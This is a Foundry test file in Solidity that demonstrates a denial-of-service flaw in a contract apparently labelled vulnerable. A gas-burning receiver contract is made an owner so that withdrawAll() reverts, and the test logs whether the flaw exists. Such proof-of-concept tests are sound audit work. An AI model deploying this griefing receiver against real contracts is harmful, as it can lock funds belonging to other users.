// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/multiowned_vulnerable.sol";

contract CostlyReceiver {
    uint256 public receivedValue;
    
    receive() external payable {
        receivedValue = msg.value;
        // Consume more than 2300 gas through a gas-intensive loop
        uint256 i;
        while (gasleft() > 2100) {
            // Consume 10 gas per iteration (3 for JUMP, 7 for condition)
            i++;
        }
    }
}

contract TestDenialWithdraw is Test {
    TestContract public multiOwnable;
    CostlyReceiver public costlyReceiver;
    address public deployer = makeAddr("deployer");
    uint256 public constant TEST_BALANCE = 1 ether;

    function setUp() public {
        vm.startPrank(deployer);
        multiOwnable = new TestContract();
        costlyReceiver = new CostlyReceiver();
        vm.stopPrank();

        // Add costly receiver as an owner
        vm.prank(deployer);
        multiOwnable.newOwner(address(costlyReceiver));

        // Fund the contract
        deal(address(multiOwnable), TEST_BALANCE);
    }

    function testWithdrawAllRevertsForCostlyOwner() public {
        console2.log("--- BEFORE-Trigger Withdraw ---");
        uint256 contractBalanceBefore = address(multiOwnable).balance;
        uint256 receiverEthBalanceBefore = address(costlyReceiver).balance;
        uint256 receiverStateBefore = costlyReceiver.receivedValue();
        console2.log("Contract balance: %d", contractBalanceBefore);
        console2.log("Receiver ETH balance: %d", receiverEthBalanceBefore);
        console2.log("Receiver state (receivedValue): %d", receiverStateBefore);

        console2.log("--- Trigger Withdraw ---");
        // Attempt withdrawal by costly owner (should revert)
        vm.prank(address(costlyReceiver));
        vm.expectRevert();
        multiOwnable.withdrawAll();

        console2.log("--- AFTER-Trigger Withdrawal ---");
        uint256 contractBalanceAfter = address(multiOwnable).balance;
        uint256 receiverEthBalanceAfter = address(costlyReceiver).balance;
        uint256 receiverStateAfter = costlyReceiver.receivedValue();
        console2.log("Contract balance: %d", contractBalanceAfter);
        console2.log("Receiver ETH balance: %d", receiverEthBalanceAfter);
        console2.log("Receiver state (receivedValue): %d", receiverStateAfter);

        // Vulnerability verification: State should remain unchanged
        bool stateUnchanged = (contractBalanceAfter == contractBalanceBefore) &&
                             (receiverEthBalanceAfter == receiverEthBalanceBefore) &&
                             (receiverStateAfter == receiverStateBefore);
        
        // Final vulnerability verdict
        if (stateUnchanged) {
            console2.log("Vulnerability Exists: State unchanged due to revert confirms DoS vulnerability");
        } else {
            console2.log("Vulnerability not Exist: State changed during withdrawal");
        }
    }
}